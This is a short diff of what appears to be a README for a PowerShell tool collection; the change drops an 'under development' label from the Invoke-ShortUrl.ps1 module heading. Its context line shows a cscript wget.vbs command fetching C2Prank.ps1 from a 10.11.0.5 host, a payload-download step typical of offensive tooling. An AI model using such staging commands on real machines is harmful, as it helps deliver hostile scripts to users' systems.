@@ -54,7 +54,7 @@ cscript wget.vbs http://10.11.0.5/C2Prank.ps1 C2Prank.ps1
 <br />
 
 ## Module Name
-   <b><i>Invoke-ShortUrl.ps1 - UNDER-DEVELOP (NOT STABLE)</i></b>
+   <b><i>Invoke-ShortUrl.ps1</i></b>
    
 |Cmdlet Name|Description|Privileges|Notes|
 |---|---|---|---|
